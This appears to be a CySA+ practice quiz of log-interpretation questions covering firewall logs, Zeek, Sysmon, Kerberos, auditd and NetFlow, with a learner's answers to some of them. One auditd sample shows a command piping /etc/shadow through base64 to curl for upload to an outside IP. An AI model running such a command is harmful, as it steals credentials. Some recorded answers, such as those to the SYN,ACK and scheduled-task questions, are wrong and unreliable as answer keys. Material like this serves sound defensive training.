title: Very Hard Technical CySA+ Practice Set
summary: 15 very hard technical and misleading CySA+ / SOC analyst questions focused on firewall direction, TCP flags, Zeek conn.log, Windows logon types, Sysmon, Suricata fields, Active Directory DNS, Kerberos, Linux auditd, web logs, NetFlow, TLS phishing infrastructure, Windows services, SIEM correlation, and Linux external transfers.

questions.question:
Evaluate the following firewall log:

kernel: iptables FORWARD DROP IN=eth1 OUT=eth0 SRC=10.20.4.55 DST=198.51.100.44 PROTO=TCP SPT=50122 DPT=443 SYN

Which interpretation is MOST accurate?
options: The local host blocked traffic destined to itself on TCP/443
The firewall dropped a DNS query leaving the internal network
The firewall blocked routed outbound HTTPS connection initiation
The destination server rejected an established inbound connection
questions.myAnswer: C, because its outbound https traffic and its blocked "DROP"

questions.question:
A packet capture shows the following TCP flags:

SRC=203.0.113.10 SPT=443 DST=10.1.5.25 DPT=51244 FLAGS=SYN,ACK

Which statement is MOST accurate?
options: The external HTTPS server is responding to a client connection attempt
The internal workstation is initiating an outbound HTTPS connection
The internal workstation is rejecting an inbound TLS negotiation attempt
The external HTTPS server is initiating a new connection to the client
questions.myAnswer: D, because its three way handshake from https to dynamic port

questions.question:
A Zeek conn.log entry contains:

id.orig_h=10.3.9.20 id.resp_h=203.0.113.70 id.resp_p=22 proto=tcp service=ssh history=ShR duration=0.02 orig_bytes=0 resp_bytes=0

Which interpretation is BEST?
options: The SSH connection completed and transferred data successfully
The originator sent data before the responder acknowledged it
The responder accepted the connection and then sent payload data
The connection was attempted, but the responder reset it quickly
questions.myAnswer: D, because in conn.log "ShR" means connection was quickly closed by the responder

questions.question:
A Windows Security event shows:

Event ID: 4624
Logon Type: 3
Authentication Package: NTLM
Account Name: backup_svc
Source Network Address: 10.0.8.44

Shortly afterward, the same account accesses \\FS01\C$.

What should the analyst suspect FIRST?
options: Interactive keyboard login at the file server console
Network logon using a service account to access admin shares
Remote desktop session with full graphical user interaction
Kerberos ticket renewal without resource access activity

questions.question:
A Sysmon Event ID 11 shows:

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Public\update.ps1

A later Event ID 1 shows:

Image: C:\Windows\System32\schtasks.exe
CommandLine: schtasks /Create /SC MINUTE /MO 5 /TN UpdateCheck /TR "powershell -File C:\Users\Public\update.ps1"

What is the BEST interpretation?
options: PowerShell wrote a temporary browser cache file and then removed it
The user manually scheduled a normal Windows cumulative update task
A script was staged and configured for recurring execution as persistence
The system automatically rotated a service account credential every minute
questions.myAnswer: D, because "/SC MINUTE" probably means execution every minute

questions.question:
A Suricata alert contains:

alert http any any -> any any (msg:"Possible path traversal"; content:"../"; http_uri; nocase; sid:300111;)

Which field should the analyst inspect FIRST to confirm the rule matched the attempted path?
options: http_uri
tls.sni
dns.rrname
flow_id

questions.question:
A DNS log shows repeated queries:

_ldap._tcp.dc._msdcs.corp.local SRV
_kerberos._tcp.corp.local SRV

From a newly joined Windows workstation during first boot.

Which conclusion is MOST appropriate?
options: The workstation is performing DNS tunneling through SRV records
The workstation is attempting Kerberoasting against SQL services
The workstation is exfiltrating encoded data to a rare domain
The workstation is discovering domain services and domain controllers
questions.myAnswer: D, because other options don't make sense

questions.question:
A Windows Security log shows many events:

Event ID: 4769
Service Name: MSSQLSvc/db01.corp.local:1433
Ticket Encryption Type: 0x17
Account Name: normal.user

Why might this be relevant during threat hunting?
options: Event 4769 with RC4 always proves successful domain compromise
RC4 service tickets for SPNs can be useful Kerberoasting evidence
MSSQL service names prove DNS tunneling over TCP port 1433
Kerberos service ticket events only appear during password resets

questions.question:
A Linux auditd event shows:

type=EXECVE msg=audit(1718801111.456:802): argc=3 a0="bash" a1="-c" a2="cat /etc/shadow | base64 | curl -X POST --data-binary @- https://198.51.100.20/upload"

Which activity is MOST directly indicated?
options: Credential file access followed by encoded upload over HTTPS
Normal package verification using a signed repository mirror
Local user enumeration without any network transfer activity
DNS tunneling using TXT record responses and cached resolvers

questions.question:
An nginx access log shows:

10.1.9.77 - - "GET /admin HTTP/1.1" 302
10.1.9.77 - - "GET /login HTTP/1.1" 200
10.1.9.77 - - "POST /login HTTP/1.1" 401
10.1.9.77 - - "POST /login HTTP/1.1" 401
10.1.9.77 - - "POST /login HTTP/1.1" 200

Which interpretation is BEST?
options: The user received a forbidden response before any authentication attempt
The web server failed DNS resolution and then accepted anonymous access
The client was redirected to login and later authenticated after failures
The HTTP 302 confirms exploitation of a remote code execution flaw
questions.myAnswer: C, because 302 means "Found" and 401 means "Unauthorized", 200 is "Ok"

questions.question:
A NetFlow record shows:

src=10.8.4.20 dst=203.0.113.90 dst_port=443 bytes_out=2400 bytes_in=780000000 duration=3600

What should the analyst conclude FIRST?
options: The host likely uploaded a large amount of internal data externally
The host likely downloaded a large amount of data from the remote system
The flow proves DNS tunneling because the destination used HTTPS
The flow proves lateral movement because the destination is public
questions.myAnswer: B, because host received big amount of bytes

questions.question:
A TLS log shows:

sni=login-microsoftonline-security.com
subject=CN=login-microsoftonline-security.com
issuer=Let's Encrypt
not_before=2026-06-08
ja3=72a589da586844d7f0818ce684948eea

A user clicked a Microsoft 365 security alert email five minutes earlier.

Which conclusion is MOST defensible?
options: The domain is legitimate because it contains microsoftonline
The certificate issuer proves the destination is Microsoft owned
JA3 alone proves the destination is a phishing website
The lookalike SNI and recent certificate support phishing investigation
questions.myAnswer: D, because other options kinda don't make sense

questions.question:
A Windows event shows:

Event ID: 7045
Service Name: AdobeUpdateSvc
Service File Name: C:\Users\Public\adobe_update.exe
Start Type: auto start
Account Name: LocalSystem

Which response is MOST appropriate FIRST?
options: Investigate as possible service-based persistence before deleting evidence
Ignore because all Adobe update services run from the Public directory
Reboot immediately to remove volatile memory before collecting evidence
Close the alert because LocalSystem services cannot be malicious

questions.question:
A SIEM correlation rule fires when:

ParentImage endswith WINWORD.EXE
Image endswith powershell.exe
CommandLine contains -EncodedCommand
DestinationPort equals 443 within 60 seconds

What does this rule BEST detect?
options: Kerberos pre-authentication failure from a domain controller
Normal Office document printing followed by TLS certificate renewal
Malicious document execution leading to encoded PowerShell C2 behavior
DNS service discovery from a workstation joining Active Directory
questions.myAnswer: C, because of encoded powershell command execution from Word

questions.question:
A Linux auth.log shows:

sshd[1441]: Accepted publickey for deploy from 10.0.5.44 port 51902 ssh2
sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/rsync -av /srv/data/ backup@203.0.113.55:/tmp/sync/

Which statement is MOST accurate?
options: The log proves password spraying because the login used publickey
The log proves DNS tunneling because rsync uses encoded subdomains
The log shows a local-only backup with no external network connection
The log shows privileged rsync transfer to an external host requiring validation
